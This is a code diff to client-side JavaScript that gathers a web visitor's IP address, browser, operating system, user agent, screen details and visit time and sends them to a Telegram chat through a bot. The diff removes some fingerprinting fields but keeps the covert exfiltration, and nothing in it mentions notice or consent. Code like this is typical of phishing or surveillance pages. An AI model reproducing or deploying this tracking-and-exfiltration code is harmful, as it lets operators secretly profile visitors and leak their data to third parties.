@@ -976,10 +976,6 @@
             languages: navigator.languages ? navigator.languages.join(', ') : "Unknown",
             cookieEnabled: navigator.cookieEnabled,
             javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-            pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-            hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
-            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown",
-            maxTouchPoints: navigator.maxTouchPoints || 0,
             userAgent: ua
         };
     }
@@ -988,25 +984,8 @@
     function getScreenInfo() {
         return {
             resolution: `${screen.width}x${screen.height}`,
-            availableResolution: `${screen.availWidth}x${screen.availHeight}`,
-            colorDepth: `${screen.colorDepth} bit`,
-            pixelDepth: `${screen.pixelDepth} bit`,
             orientation: screen.orientation ? screen.orientation.type : "Unknown"
         };
-    }
-
-    // Function to get connection information
-    function getConnectionInfo() {
-        const connection = navigator.connection;
-        if (connection) {
-            return {
-                effectiveType: connection.effectiveType || "Unknown",
-                downlink: connection.downlink ? connection.downlink + " Mbps" : "Unknown",
-                rtt: connection.rtt ? connection.rtt + " ms" : "Unknown",
-                saveData: connection.saveData || false
-            };
-        }
-        return { effectiveType: "Unknown" };
     }
 
     // Function to send data to Telegram with inline keyboard
@@ -1044,7 +1023,7 @@
                 chat_id: TELEGRAM_CHAT_ID,
                 text: message,
                 parse_mode: 'HTML',
-                disable_web_page_preview: false
+                disable_web_page_preview: true // This prevents the IP info thumbnail
             };
 
             if (keyboard) {
@@ -1206,19 +1185,13 @@
             // Get detailed browser information
             const browserInfo = getDetailedBrowserInfo();
             const screenInfo = getScreenInfo();
-            const connectionInfo = getConnectionInfo();
             
             // Get timezone and location info
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             const locale = navigator.language;
             
-            // Get more detailed timing information
-            const timing = performance.timing;
-            const pageLoadTime = timing.loadEventEnd - timing.navigationStart;
-            const domReadyTime = timing.domContentLoadedEventEnd - timing.navigationStart;
-            
             // Create clickable IP link
-            const ipLink = `https://ipinfo.io/${userIP}?lookup_source=search-bar`;
+            const ipLink = `https://ipinfo.io/${userIP}`;
             
             // Send detailed visitor information to Telegram
             await sendToTelegram(`
@@ -1233,31 +1206,15 @@
 💻 <b>Operating System:</b> ${browserInfo.os}
 📱 <b>Platform:</b> ${browserInfo.platform}
 🌐 <b>User Agent:</b> <code>${browserInfo.userAgent}</code>
-🗣️ <b>Languages:</b> ${browserInfo.languages}
 🍪 <b>Cookies Enabled:</b> ${browserInfo.cookieEnabled ? 'Yes' : 'No'}
 ☕ <b>Java Enabled:</b> ${browserInfo.javaEnabled ? 'Yes' : 'No'}
-📄 <b>PDF Viewer:</b> ${browserInfo.pdfViewerEnabled ? 'Yes' : 'No'}
 
 <b>📊 SYSTEM INFORMATION</b>
 🖥️ <b>Screen Resolution:</b> ${screenInfo.resolution}
-📐 <b>Available Screen:</b> ${screenInfo.availableResolution}
-🎨 <b>Color Depth:</b> ${screenInfo.colorDepth}
-🖼️ <b>Pixel Depth:</b> ${screenInfo.pixelDepth}
 📱 <b>Orientation:</b> ${screenInfo.orientation}
-⚡ <b>CPU Cores:</b> ${browserInfo.hardwareConcurrency}
-💾 <b>Device Memory:</b> ${browserInfo.deviceMemory}
-👆 <b>Max Touch Points:</b> ${browserInfo.maxTouchPoints}
 
-<b>📶 NETWORK INFORMATION</b>
-📡 <b>Connection Type:</b> ${connectionInfo.effectiveType}
-⬇️ <b>Download Speed:</b> ${connectionInfo.downlink}
-⏱️ <b>Round Trip Time:</b> ${connectionInfo.rtt}
-💾 <b>Data Saver:</b> ${connectionInfo.saveData ? 'Yes' : 'No'}
-
-<b>⏰ PERFORMANCE</b>
-⏳ <b>Page Load Time:</b> ${pageLoadTime}ms
-🚀 <b>DOM Ready Time:</b> ${domReadyTime}ms
-📅 <b>Timestamp:</b> ${new Date().toLocaleString()}
+<b>📅 TIMESTAMP</b>
+🕒 <b>Visit Time:</b> ${new Date().toLocaleString()}
             `.trim(), null, true);
             
         } catch (error) {
